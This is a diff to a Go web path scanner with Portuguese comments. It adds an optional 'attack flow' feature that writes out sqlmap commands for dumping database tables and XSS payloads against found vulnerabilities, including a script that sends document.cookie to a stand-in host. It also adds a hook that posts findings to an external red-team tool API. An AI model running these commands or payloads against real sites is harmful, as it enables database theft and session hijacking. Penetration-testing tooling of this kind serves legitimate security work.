@@ -38,12 +38,7 @@ const (
 	Bold        = "\033[1m"
 )
 
-var (
-	bodyBufPool = sync.Pool{New: func() interface{} {
-		s := make([]byte, 0, 32*1024) // Pré-aloca a capacidade necessária
-		return &s
-	}}
-)
+
 
 type BruxoEngine struct {
 	config         *Config
@@ -86,7 +81,16 @@ type Config struct {
 	Timeout           int
 	FindHidden        bool
 	GroqAPIKey        string
+	EnableAttackFlow  bool
+	RedTeamToolURL    string
 }
+
+type AttackStep struct {
+	Stage   string `json:"Stage"`
+	Command string `json:"Command"`
+}
+
+type AttackFlow []AttackStep
 
 type Vulnerability struct {
 	Name           string `json:"Name"`
@@ -94,6 +98,7 @@ type Vulnerability struct {
 	Severity       string `json:"Severity"`
 	Description    string `json:"Description"`
 	Recommendation string `json:"Recommendation"`
+	AttackFlow     AttackFlow `json:"AttackFlow,omitempty"`
 }
 
 type ScanResult struct {
@@ -236,8 +241,8 @@ func (b *BruxoEngine) setupSignalHandler() {
 func (b *BruxoEngine) Scan() error {
 	b.setupSignalHandler()
 	b.progress.startTime = time.Now()
-	b.workQueue = make(chan string, b.config.NumThreads*20)
-	b.resultsChan = make(chan ScanResult, b.config.NumThreads*100)
+	b.workQueue = make(chan string, b.config.NumThreads)
+	b.resultsChan = make(chan ScanResult, b.config.NumThreads)
 
 	totalLines, err := countLines(b.config.WordlistPath)
 	if err != nil {
@@ -251,8 +256,9 @@ func (b *BruxoEngine) Scan() error {
 		go b.worker()
 	}
 
+	// Inicia o coletor de resultados e a barra de progresso
 	b.wg.Add(1)
-	// Inicia a barra de progresso em uma goroutine separada
+	go b.collectResults()
 	b.wg.Add(1)
 	go b.printProgressPeriodically()
 
@@ -328,6 +334,22 @@ func (b *BruxoEngine) Scan() error {
 		b.showSpinner(b.ctx, "Analisando com IA")
 		b.performBulkAIAnalysis()
 		b.logger.Info("AI analysis complete.")
+	}
+
+	if b.config.EnableAttackFlow {
+		for i := range b.results {
+			result := &b.results[i]
+			for j := range result.Vulnerabilities {
+				vuln := &result.Vulnerabilities[j]
+				vuln.AttackFlow = b.generateAttackFlow(vuln.Name, result.URL)
+			}
+		}
+	}
+
+	if b.config.RedTeamToolURL != "" {
+		for i := range b.results {
+			b.integrateWithRedTeamTool(&b.results[i])
+		}
 	}
 
 	fmt.Println()
@@ -425,24 +447,6 @@ func (b *BruxoEngine) collectResults() {
 
 				b.results = append(b.results, result)
 				b.mu.Unlock()
-
-				// Pause the progress bar to print the result
-				fmt.Printf("\r\033[K") // Limpa a linha
-
-				color := getStatusCodeColor(result.StatusCode)
-				if result.IsHidden {
-					color = ColorPurple
-				}
-
-				fmt.Printf("%s[%d]%s %s (%d bytes)\n",
-					color,
-					result.StatusCode,
-					ColorReset,
-					result.URL,
-					result.ContentLength)
-
-				// Resume the progress bar
-				b.printProgress()
 			}
 		}
 	}
@@ -470,7 +474,6 @@ func (b *BruxoEngine) shouldShowResult(statusCode int) bool {
 func (b *BruxoEngine) printProgress() {
 	completed := atomic.LoadInt64(&b.progress.completed)
 	total := atomic.LoadInt64(&b.progress.totalPaths)
-	found := atomic.LoadInt64(&b.progress.found)
 	hidden := atomic.LoadInt64(&b.progress.hidden)
 	duration := time.Since(b.progress.startTime).Seconds()
 
@@ -484,8 +487,8 @@ func (b *BruxoEngine) printProgress() {
 		percentage = (float64(completed) / float64(total)) * 100
 	}
 
-	fmt.Printf("\r%s[%.2f%%] Complete: %d/%d | Found: %d | Hidden: %d | RPS: %.0f%s",
-		Bold, percentage, completed, total, found, hidden, rps, ColorReset)
+	fmt.Printf("\r%s[%.2f%%] Complete: %d/%d | Hidden: %d | RPS: %.0f%s",
+		Bold, percentage, completed, total, hidden, rps, ColorReset)
 }
 
 func (b *BruxoEngine) printProgressPeriodically() {
@@ -593,6 +596,64 @@ func (b *BruxoEngine) generateHTMLReport() error {
 	return tmpl.Execute(file, data)
 }
 
+func (b *BruxoEngine) generateAttackFlow(vulnName, targetURL string) AttackFlow {
+	switch vulnName {
+	case "SQL Injection":
+		return []AttackStep{
+			{Stage: "Detecção", Command: fmt.Sprintf(`sqlmap -u "%s" --dbs --batch`, targetURL)},
+			{Stage: "Exploração", Command: fmt.Sprintf(`sqlmap -u "%s" -D <database> --tables --batch`, targetURL)},
+			{Stage: "Exfiltração", Command: fmt.Sprintf(`sqlmap -u "%s" -D <database> -T <tabela> --dump --batch`, targetURL)},
+		}
+	case "Cross-Site Scripting (XSS)":
+		return []AttackStep{
+			{Stage: "Verificação", Command: `<script>alert(document.domain)</script>`},
+			{Stage: "Exploração", Command: `<script>fetch('https://sua-maquina.com/?cookie='+document.cookie)</script>`},
+			{Stage: "Pivoting", Command: `document.location='https://site-interno-da-rede'`},
+		}
+		// Adicione mais casos para outras vulnerabilidades aqui
+	}
+	return nil
+}
+
+func (b *BruxoEngine) integrateWithRedTeamTool(result *ScanResult) {
+	// Exemplo de integração com uma ferramenta externa como o brutex-api
+	for _, vuln := range result.Vulnerabilities {
+		if vuln.Name == "SQL Injection" { // Ou qualquer outra condição
+			b.logger.Info("Integrating with the Red Team tool for %s in %s", vuln.Name, result.URL)
+
+			payload := map[string]string{
+				"vulnerability": vuln.Name,
+				"target":      result.URL,
+				"technique":   "UNION-based", // Isso pode ser mais dinâmico
+			}
+			jsonPayload, _ := json.Marshal(payload)
+
+			req := fasthttp.AcquireRequest()
+			resp := fasthttp.AcquireResponse()
+			defer fasthttp.ReleaseRequest(req)
+			defer fasthttp.ReleaseResponse(resp)
+
+			req.SetRequestURI(b.config.RedTeamToolURL)
+			req.Header.SetMethod("POST")
+			req.Header.SetContentType("application/json")
+			req.SetBody(jsonPayload)
+
+			if err := b.httpClient.Do(req, resp); err != nil {
+				b.logger.Error("Error contacting the Red Team tool API: %v", err)
+				continue
+			}
+
+			if resp.StatusCode() == fasthttp.StatusOK {
+				b.logger.Info("Payload generated successfully by the API for %s", result.URL)
+				// Você pode processar a resposta da API aqui
+				b.logger.Debug("API response: %s", string(resp.Body()))
+			} else {
+				b.logger.Error("Failed to generate payload by the API for %s. Status: %d", result.URL, resp.StatusCode())
+			}
+		}
+	}
+}
+
 func (b *BruxoEngine) categorizePath(path string) string {
 	path = strings.ToLower(path)
 	switch {
@@ -649,7 +710,7 @@ func (b *BruxoEngine) analyzeVulnerabilities(result *ScanResult) {
 		}
 	}
 
-		// Análise de Cabeçalhos HTTP
+	// Análise de Cabeçalhos HTTP
 	if len(result.Headers) > 0 {
 		// Verificação de Divulgação de Tecnologia
 		if serverHeader, ok := result.Headers["Server"]; ok {
@@ -864,10 +925,12 @@ func main() {
 	flag.BoolVar(&config.Verbose, "v", false, "Verbose mode")
 	flag.BoolVar(&config.Debug, "debug", false, "Debug mode")
 	flag.IntVar(&config.Timeout, "timeout", 10, "Request timeout in seconds")
-	flag.BoolVar(&config.FindHidden, "hidden", true, "Detect hidden content by response body difference")
+	flag.BoolVar(&config.FindHidden, "hidden", false, "Find hidden paths by comparing response with a non-existent path")
+	flag.StringVar(&config.GroqAPIKey, "groq-api-key", os.Getenv("GROQ_API_KEY"), "Groq API Key for AI analysis")
+	flag.BoolVar(&config.EnableAttackFlow, "attack-flow", false, "Enable guided attack flows for found vulnerabilities")
+	flag.StringVar(&config.RedTeamToolURL, "red-team-tool-url", "", "URL of the Red Team tool API for integration")
 
 	// Lê a chave da API da variável de ambiente
-	config.GroqAPIKey = os.Getenv("GROQ_API_KEY")
 	if config.GroqAPIKey == "" {
 		fmt.Println(ColorYellow + "[WARNING] GROQ_API_KEY environment variable not set. AI analysis will be skipped." + ColorReset)
 	}
